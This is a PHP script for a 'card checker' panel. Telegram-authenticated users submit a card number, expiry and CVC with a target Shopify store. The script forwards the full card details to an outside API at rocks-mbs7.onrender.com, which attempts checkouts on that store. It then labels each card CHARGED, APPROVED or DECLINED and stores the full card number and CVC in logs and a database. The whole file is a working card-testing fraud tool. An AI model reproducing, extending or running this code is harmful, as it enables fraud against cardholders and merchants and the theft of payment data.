<?php
session_start();
header('Content-Type: application/json');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

// Log file for debugging
$log_file = __DIR__ . '/autoshopify_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    log_message("Unauthorized access attempt in autoshopify.php");
    echo json_encode(['status' => 'ERROR', 'message' => 'Unauthorized access']);
    exit;
}

// Load environment variables
$envFile = __DIR__ . '/.env';
$_ENV = [];
if (file_exists($envFile)) {
    $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0 || !strpos($line, '=')) {
            continue;
        }
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
    }
} else {
    log_message("Environment file (.env) not found in " . __DIR__);
}

// Database connection (optional, for result storage)
try {
    if (!isset($_ENV['DATABASE_URL'])) {
        log_message("DATABASE_URL not set in .env file");
    } else {
        $dbUrl = parse_url($_ENV['DATABASE_URL']);
        if (!$dbUrl || !isset($dbUrl['host'], $dbUrl['port'], $dbUrl['user'], $dbUrl['pass'], $dbUrl['path'])) {
            throw new Exception("Invalid DATABASE_URL format");
        }
        $pdo = new PDO(
            "pgsql:host={$dbUrl['host']};port={$dbUrl['port']};dbname=" . ltrim($dbUrl['path'], '/'),
            $dbUrl['user'],
            $dbUrl['pass'],
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
        log_message("Database connected in autoshopify.php");
    }
} catch (Exception $e) {
    log_message("Database connection failed in autoshopify.php: " . $e->getMessage());
    $pdo = null; // Continue without DB
}

// Function to check a single card on a single site with retry
function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
    global $pdo;
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    $api_url = "https://rocks-mbs7.onrender.com/index.php?site=$site&cc=$encoded_cc";
    log_message("Checking card: $card_details on site: $site, URL: $api_url");

    for ($attempt = 0; $attempt <= $retry; $attempt++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        $curl_errno = curl_errno($ch);
        curl_close($ch);

        log_message("Attempt " . ($attempt + 1) . " for $card_details on $site: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 100));

        // Handle API errors
        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
            if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                log_message("Timeout for $card_details on $site, retrying...");
                usleep(500000); // 0.5s delay before retry
                continue;
            }
            log_message("Failed for $card_details on $site: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
            $result = [
                'status' => 'DECLINED',
                'message' => "API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)",
                'card_details' => $card_details
            ];
            // Store result in database if available
            if ($pdo) {
                try {
                    $stmt = $pdo->prepare("
                        INSERT INTO results (telegram_id, card_number, status, response, gateway, checked_at)
                        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                    ");
                    $stmt->execute([
                        $_SESSION['user']['telegram_id'],
                        $card_details,
                        $result['status'],
                        $result['message'],
                        'autoshopify'
                    ]);
                    log_message("Stored result for $card_details in database");
                } catch (Exception $e) {
                    log_message("Failed to store result for $card_details: " . $e->getMessage());
                }
            }
            return $result;
        }

        // Parse JSON response
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['Response'], $result['Status'])) {
            log_message("Invalid JSON for $card_details on $site: " . substr($response, 0, 100));
            $result = [
                'status' => 'DECLINED',
                'message' => "Invalid API response: " . substr($response, 0, 100),
                'card_details' => $card_details
            ];
            // Store result in database if available
            if ($pdo) {
                try {
                    $stmt = $pdo->prepare("
                        INSERT INTO results (telegram_id, card_number, status, response, gateway, checked_at)
                        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                    ");
                    $stmt->execute([
                        $_SESSION['user']['telegram_id'],
                        $card_details,
                        $result['status'],
                        $result['message'],
                        'autoshopify'
                    ]);
                    log_message("Stored result for $card_details in database");
                } catch (Exception $e) {
                    log_message("Failed to store result for $card_details: " . $e->getMessage());
                }
            }
            return $result;
        }

        // Map Shopify API response to status
        $response_text = $result['Response'];
        $status = 'DECLINED';
        if (in_array($response_text, ['Thank You', 'ORDER_PLACED'])) {
            $status = 'CHARGED';
        } elseif (in_array($response_text, ['INCORRECT_ZIP', 'INCORRECT_CVV', '3D_AUTHENTICATION', 'INSUFFICIENT_FUNDS'])) {
            $status = 'APPROVED';
        } elseif (in_array($response_text, [
            'CARD_DECLINED', 'FRAUD_SUSPECTED', 'r4 token empty', 'tax amount empty', 'del amount empty',
            'INCORRECT_NUMBER', 'product id empty', 'py id empty', 'clinte token', 'EXPIRED_CARD',
            'INVALID_PAYMENT_ERROR', 'AUTHORIZATION_ERROR', 'PROCESSING_ERROR', 'HCAPTCHA DETECTED'
        ])) {
            $status = 'DECLINED';
        }

        $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
        $result = [
            'status' => $status,
            'message' => $response_msg,
            'card_details' => $card_details
        ];

        // Store result in database if available
        if ($pdo) {
            try {
                $stmt = $pdo->prepare("
                    INSERT INTO results (telegram_id, card_number, status, response, gateway, checked_at)
                    VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                ");
                $stmt->execute([
                    $_SESSION['user']['telegram_id'],
                    $card_details,
                    $result['status'],
                    $result['message'],
                    'autoshopify'
                ]);
                log_message("Stored result for $card_details in database");
            } catch (Exception $e) {
                log_message("Failed to store result for $card_details: " . $e->getMessage());
            }
        }

        log_message("$status for $card_details on $site: $response_msg");
        return $result;
    }

    log_message("Failed after retries for $card_details on $site");
    $result = [
        'status' => 'DECLINED',
        'message' => 'API request failed after retries',
        'card_details' => $card_details
    ];
    // Store result in database if available
    if ($pdo) {
        try {
            $stmt = $pdo->prepare("
                INSERT INTO results (telegram_id, card_number, status, response, gateway, checked_at)
                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ");
            $stmt->execute([
                $_SESSION['user']['telegram_id'],
                $card_details,
                $result['status'],
                $result['message'],
                'autoshopify'
            ]);
            log_message("Stored result for $card_details in database");
        } catch (Exception $e) {
            log_message("Failed to store result for $card_details: " . $e->getMessage());
        }
    }
    return $result;
}

// Check if the request is POST and contains card and site data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !isset($_POST['site'])) {
    log_message("Invalid request or missing card/site data");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card/site data']);
    exit;
}

$card = $_POST['card'];
$site = $_POST['site'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        log_message("Missing card field: $field");
        echo json_encode(['status' => 'ERROR', 'message' => "Missing card field: $field"]);
        exit;
    }
}

// Sanitize and validate inputs
$card_number = preg_replace('/[^0-9]/', '', $card['number']);
$exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
$exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
$cvc = preg_replace('/[^0-9]/', '', $card['cvc']);
$site = filter_var($site, FILTER_SANITIZE_URL);

// Normalize exp_month to 2 digits
$exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    log_message("Invalid exp_month format: $exp_month_raw");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_month format']);
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y');
    $current_century = (int) (date('Y') - $current_year);
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    log_message("Invalid exp_year format: $exp_year_raw");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
    exit;
}

// Validate card number, year, and CVC
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    log_message("Invalid card number format: $card_number");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid card number format']);
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
    log_message("Invalid exp_year after normalization: $exp_year");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format or too far in future']);
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    log_message("Invalid CVC format: $cvc");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid CVC format']);
    exit;
}

// Validate logical expiry
$expiry_timestamp = strtotime("$exp_year-$exp_month-01");
$current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
    echo json_encode(['status' => 'DECLINED', 'message' => "Card expired: $card_number|$exp_month|$exp_year|$cvc"]);
    exit;
}

// Validate site
if (!filter_var($site, FILTER_VALIDATE_URL)) {
    log_message("Invalid site URL: $site");
    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid site URL']);
    exit;
}

// Process card with the specified site
$result = checkCard($site, $card_number, $exp_month, $exp_year, $cvc);

// Format response to match index.php expectations
echo json_encode([
    'status' => $result['status'],
    'message' => "[{$result['message']}]",
    'card' => $result['card_details'],
    'site' => $site
]);
?>
